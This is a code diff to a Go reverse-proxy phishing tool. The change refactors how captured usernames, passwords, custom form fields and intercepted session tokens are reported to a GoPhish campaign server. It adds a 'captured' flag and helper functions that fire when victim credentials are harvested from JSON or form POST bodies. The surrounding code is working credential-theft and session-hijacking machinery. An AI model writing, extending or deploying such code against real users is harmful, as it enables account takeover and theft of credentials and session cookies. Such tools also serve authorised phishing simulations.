@@ -674,6 +674,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
 
 						if json_re.MatchString(contentType) {
+							captured:= false
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
@@ -683,6 +684,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
 									}
+									captured = true
 								}
 							}
 
@@ -694,6 +696,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
+									captured = true
 								}
 							}
 
@@ -706,8 +709,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
 										}
+										captured = true
 									}
 								}
+							}
+							if captured {
+								p.ReportCredentialsSubmitted(ps.SessionId)
 							}
 
 							// force post json
@@ -753,6 +760,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
+								captured:= false
 
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
@@ -765,6 +773,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+											captured = true
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -775,6 +784,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+											captured = true
 										}
 									}
 									for _, cp := range pl.custom {
@@ -786,9 +796,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
+												captured = true
 											}
 										}
 									}
+								}
+								if captured {
+									p.ReportCredentialsSubmitted(ps.SessionId)
 								}
 
 								for k, v := range req.PostForm {
@@ -1062,16 +1076,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.Finish(false)
 
-						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-							rid, ok := s.Params["rid"]
-							if ok && rid != "" {
-								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS(), p.cfg.GetGoPhishSessions())
-								err = p.gophish.ReportCredentialsSubmitted(rid, s, p.cfg.GetGoPhishSessions())
-								if err != nil {
-									log.Error("gophish: %s", err)
-								}
-							}
-						}
+						p.ReportCapturedSession(ps.SessionId)
 					}
 				}
 			}
@@ -1202,16 +1207,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 							}
 
-							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-								rid, ok := s.Params["rid"]
-								if ok && rid != "" {
-									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS(), p.cfg.GetGoPhishSessions())
-									err = p.gophish.ReportCredentialsSubmitted(rid, s, p.cfg.GetGoPhishSessions())
-									if err != nil {
-										log.Error("gophish: %s", err)
-									}
-								}
-							}
+							p.ReportCapturedSession(ps.SessionId)
 							break
 						}
 					}
@@ -1595,6 +1591,36 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetCustom(name, value)
+	}
+}
+
+func (p *HttpProxy) ReportCredentialsSubmitted(session string) {
+	if s, ok := p.sessions[session]; ok {
+		if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+			rid, ok := s.Params["rid"]
+			if ok && rid != "" {
+				p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS(), p.cfg.GetGoPhishSessions())
+				err := p.gophish.ReportCredentialsSubmitted(rid, s, p.cfg.GetGoPhishSessions())
+				if err != nil {
+					log.Error("gophish: %s", err)
+				}
+			}
+		}
+	}
+}
+
+func (p *HttpProxy) ReportCapturedSession(session string) {
+	if s, ok := p.sessions[session]; ok {
+		if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+			rid, ok := s.Params["rid"]
+			if ok && rid != "" {
+				p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS(), p.cfg.GetGoPhishSessions())
+				err := p.gophish.ReportCapturedSession(rid, s, p.cfg.GetGoPhishSessions())
+				if err != nil {
+					log.Error("gophish: %s", err)
+				}
+			}
+		}
 	}
 }
 
